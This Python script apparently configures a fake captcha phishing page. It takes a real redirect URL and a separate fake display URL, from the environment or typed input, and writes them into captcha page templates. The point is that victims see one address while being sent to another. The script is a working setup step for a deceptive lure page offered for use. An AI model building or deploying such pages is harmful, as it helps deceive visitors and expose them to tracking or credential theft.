#!/usr/bin/env python3
import os
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

real_forward = os.getenv('REDIRECT')
fake_forward = os.getenv('DISPLAY_URL')

if real_forward is None:
    real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Real Forward URL :{W} '+real_forward)

if fake_forward is None:
    fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Fake Forward URL :{W} '+fake_forward)

with open('template/captcha/js/main_temp.js', 'r') as location_temp:
    js_file = location_temp.read()
    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)

with open('template/captcha/js/main.js', 'w') as updated_js:
    updated_js.write(updated_js_raw)

with open('template/captcha/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    if os.getenv("DEBUG_HTTP"):
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')
    upd_temp_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', fake_forward)

with open('template/captcha/index.html', 'w') as updated_index:
    updated_index.write(upd_temp_index_raw)